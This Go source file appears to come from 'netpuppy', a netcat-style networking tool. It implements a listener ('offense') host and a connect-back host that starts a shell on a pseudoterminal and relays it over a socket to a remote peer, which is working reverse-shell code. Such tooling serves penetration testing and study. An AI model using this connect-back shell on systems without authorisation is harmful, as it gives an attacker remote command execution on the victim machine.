package hosts

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"

	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/ioctl"
	"github.com/trshpuppy/netpuppy/pkg/pty"
)

type Host interface {
	Start(context.Context) (error, int)
}

type OffensiveHost struct {
	socket conn.SocketInterface
	stdin  *os.File
	stdout *os.File
	stderr *os.File
}

type LAMEConnectBackHost struct {
	socket conn.SocketInterface
	stdin  *os.File
	stdout *os.File
	stderr *os.File
}

type ConnectBackHost struct {
	socket       conn.SocketInterface
	masterDevice *os.File
	ptsDevice    *os.File
	shellBool    bool
	shell        *exec.Cmd
}

func NewHost(peer *conn.Peer, c conn.ConnectionGetter) (Host, error) {
	// Based on the connection type requested by the user:
	switch peer.ConnectionType {
	case "offense":
		socket, err := c.GetConnectionFromListener(peer.LPort, peer.Address, peer.Shell)
		if err != nil {
			return nil, errors.New("Error getting Listener socket: " + err.Error())
		}

		// We've got the socket, attach it to .... host struct?
		host := OffensiveHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
		return &host, nil
	case "connect-back":
		socket, err := c.GetConnectionFromClient(peer.RPort, peer.Address, peer.Shell)
		if err != nil {
			return nil, errors.New("Error getting Connect Back socket: " + err.Error())
		}

		// If the user didn't give the shell flag:
		if !peer.Shell {
			host := LAMEConnectBackHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
			return &host, nil
		}

		// Attach socket to new ConnectBackHost struct:
		host := ConnectBackHost{socket: socket, shellBool: peer.Shell}
		return &host, nil
	default:
		return nil, errors.New("Invalid Shell type when attempting to create host.")
	}
}

func (off *OffensiveHost) Start(pCtx context.Context) (error, int) {
	// Error count:
	var errorCount int

	// Enable raw mode:
	oGTermios, errno := ioctl.EnableRawMode(int(off.stdin.Fd()))
	if errno != 0 {
		return fmt.Errorf("Error enabling termios raw mode; returned error code: %s\n,", errno), errorCount
	}

	// Create child context:
	childContext, chCancel := context.WithCancel(pCtx)
	defer chCancel()

	// Create wait group for go routines:
	var wg sync.WaitGroup
	wg.Add(2)

	// Create channel for signaling other Go Routine to stop when this one quits:
	stopChan := make(chan bool, 1)

	// GO ROUTINES:
	go func() { // Read socket & copy to stdout + this routine sends stop signal to the other:
		defer wg.Done() // When this goroutine returns, the counter will decrement

		for {
			select {
			case <-childContext.Done():
				fmt.Printf("child context done in offense go routine\n")
				return
			default:
				dataFromSocket, err := off.socket.Read()
				if len(dataFromSocket) > 0 {
					// Write data to stdout:
					_, err = off.stdout.Write(dataFromSocket)
					if err != nil {
						fmt.Printf("Error writing data from socket to Offense stdout: %v\n", err)
						// Tell the other Go Routine to stop:
						stopChan <- true
						return
					}
				}

				if err != nil {
					if errors.Is(err, io.EOF) {
						// Check that the socket connection is gucci GENG:
						_, err = off.socket.WriteShit([]byte("hello?"))
						if err != nil {
							fmt.Printf("Error is: %v\n", err)
							stopChan <- true
							return
						}
						continue
					} else {
						fmt.Printf("Error reading from socket to Offense stdout: %v\n", err)
						stopChan <- true
						return
					}
				}
			}
		}
	}()

	go func() { // Read stdin & write to socket:
		defer wg.Done()
		defer chCancel()

		// Make buffer
		buffer := make([]byte, 1)

		// Read stdin byte by byte
		for {
			select {
			case <-stopChan:
				return
			default:
				i, TIT_BY_BOO := off.stdin.Read(buffer)
				if TIT_BY_BOO != nil {
					if errors.Is(TIT_BY_BOO, io.EOF) {
						continue
					} else {
						fmt.Printf("Error reading from stdin: %v\n", TIT_BY_BOO)
						return
					}
				}

				// Write to socket:
				_, err := off.socket.WriteShit(buffer[:i])
				if err != nil {
					fmt.Printf("Error writing Stdin to socket: %v\n", err)
					return
				}
			}
		}
	}()

	// Call wait after go routines b/c it's going to block:
	wg.Wait()

	//..........
	//.... TO DO
	// SINCE WE'RE DYING, LETS TELL THE OTHER HOST:
	// signal := "tiddies"

	// _, err := off.socket.WriteShit([]byte(signal))
	// if err != nil {
	// 	fmt.Printf("ERROR SENDING TIDDIES SIGNAL: %v\n", err)
	// }
	//.... </TD>
	//..........

	errno = ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)
	if errno != 0 {
		fmt.Printf("Error disabling raw mode on Offense termios, error code: " + errno.Error())
		errorCount += 1
	}

	err := off.socket.Close()
	if err != nil {
		fmt.Printf("Error closing socket on Offense host: " + err.Error())
		errorCount += 1
	}

	err = off.stdin.Close()
	if err != nil {
		fmt.Printf("Error closing stdin on Offense host: " + err.Error())
		errorCount += 1
	}

	err = off.stdout.Close()
	if err != nil {
		fmt.Printf("Error closing stdout on Offense host: " + err.Error())
		errorCount += 1
	}

	err = off.stderr.Close()
	if err != nil {
		fmt.Printf("Error closing stderr on Offense host: " + err.Error())
		errorCount += 1
	}

	return nil, errorCount
}

func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
	var errorCount int

	// Get pseudoterminal device files
	master, pts, err := pty.GetPseudoterminalDevices()
	if err != nil {
		return err, errorCount
	}
	defer master.Close()
	defer pts.Close()

	// Attach master and pts to struct:
	cb.masterDevice = master
	cb.ptsDevice = pts

	// Get Shell, attach pts to shell fds, and attach to struct
	var shellStruct *shell.RealShell
	var shellGetter shell.RealShellGetter

	shellStruct, err = shellGetter.GetConnectBackInitiatedShell()
	if err != nil {
		return err, errorCount
	}
	cb.shell = shellStruct.Shell
	defer cb.shell.Process.Release()
	defer cb.shell.Process.Kill()

	// Hook up slave/pts device to bash process:
	// .... (literally just point it to the file descriptors)
	cb.shell.Stdin = pts
	cb.shell.Stdout = pts
	cb.shell.Stderr = pts

	// Start shell:
	err = cb.shell.Start()
	if err != nil {
		return err, errorCount
	}

	// Create child context:
	childContext, chCancel := context.WithCancel(pCtx)
	defer chCancel()

	// Make waitgroups:
	var wg sync.WaitGroup
	wg.Add(2)

	// Create channel for signaling other Go Routine to stop when this one quits:
	stopSigChan := make(chan bool)

	// Go Routines:
	go func() { // Read socket and copy to master device stdin + this routine sends stop signal to other:
		defer wg.Done()

		for {
			select {
			case <-childContext.Done():
				fmt.Printf("child context done in connect back go routine\n")
				return
			default:
				// Read from socket:
				socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := cb.socket.Read() // @arthvadrr 'err'
				if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
					if errors.Is(puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die, io.EOF) {
						// Check if connection is still live: (other peer didn't close?):
						//... try to send something?
						_, err := cb.socket.WriteShit([]byte("hello?"))
						if err != nil {
							// Socket probs dead? time to quit:
							fmt.Printf("Error when checking socket connection, might be dead: %v\n", err)
							stopSigChan <- true
							return
						}
						continue
					} else {
						fmt.Printf("Error while reading from socket: %v\n", puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die)
						stopSigChan <- true
						return
					}
				}

				socketCOnString := string(socketContent)
				if socketCOnString == "break" {
					fmt.Printf("69 ACHIEVED\n")
					stopSigChan <- true
					return
				}

				// Write to master device:
				_, err := master.Write(socketContent)
				if err != nil {
					fmt.Printf("Error writing to master device: %v\n", err)
					stopSigChan <- true
					return
				}
			}
		}
	}()

	go func() { // Reading master device and writing output to socket:
		defer wg.Done()
		defer chCancel()

		// Read from master device into buffer:
		buffer := make([]byte, 1024)
		for {
			select {
			case <-stopSigChan:
				fmt.Printf("Stop signal received from other routine\n")
				return
			default:
				i, err := master.Read(buffer)
				if err != nil {
					fmt.Printf("Error reading from master device: %v\n", err)
					return
				}

				_, err = cb.socket.WriteShit(buffer[:i])
				if err != nil {
					fmt.Printf("Error writing shit to socket from master device: %v\n", err)
					return
				}
			}
		}
	}()

	// Call wg.Wait() to block parent context while go routines are going...
	wg.Wait()

	//..........
	//.... TO DO
	//     1. Need to get rid of print statements
	//     2. Send errors down socket
	//     3. Clean up error handling
	//.... </TD>
	//.........

	// Once both routines are done, cleanup:
	// close pts and master devices:
	err = pts.Close()
	if err != nil {
		fmt.Printf("Error closing PTS on exit: %v\n", err)
		errorCount += 1
	}
	master.Close()
	if err != nil {
		fmt.Printf("Error closing master on exit: %v\n", err)
		errorCount += 1
	}

	// Stop the shell:
	err = cb.shell.Process.Release()
	if err != nil {
		fmt.Printf("Error releasing shell prcoess on exit: %v\n", err)
		errorCount += 1
	}
	err = cb.shell.Process.Kill()
	if err != nil {
		fmt.Printf("Error killing shell process on exit: %v\n", err)
		errorCount += 1
	}

	// Kill connection:
	cb.socket.Close()
	if err != nil {
		fmt.Printf("Error killing shell process on exit: %v\n", err)
		errorCount += 1
	}

	return nil, errorCount
}

func (lcb *LAMEConnectBackHost) Start(pCtx context.Context) (error, int) {
	fmt.Printf("Eww, who asked for a lame connect back host? gross\n")
	return nil, 0
}
